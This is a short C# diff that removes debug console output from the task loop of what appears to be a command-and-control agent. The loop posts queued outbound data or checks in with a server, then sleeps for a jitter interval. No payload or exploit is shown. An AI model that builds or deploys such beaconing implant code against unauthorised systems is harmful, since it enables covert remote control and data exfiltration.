@@ -36,24 +36,17 @@ namespace Agent.Models
         }
         public override async Task Start(int jitterSeconds)
         {
-            System.Console.WriteLine("Starting tasks loop?");
             _tokenSource = new CancellationTokenSource();
             while (!_tokenSource.IsCancellationRequested)
             {
-                // write function that gets jitter?
-                System.Console.WriteLine("checking...");
-                // check to see if we have data to send
                 if (!Outbound.IsEmpty)
                 {
-                    System.Console.WriteLine("sending data...");
                     await PostData();
                 }
                 else
                 {
-                    System.Console.WriteLine("checking in..");
                     await Checkin();
                 }
-                System.Console.WriteLine("Before jitter SLEEP!");
                 await Task.Delay(jitterSeconds * 1000);
             }
         }
@@ -61,7 +54,6 @@ namespace Agent.Models
         private async Task Checkin()
         {
             var response = await _client.GetByteArrayAsync("/");
-            System.Console.WriteLine(response.ToString());
             HandleResponse(response);
         }
 
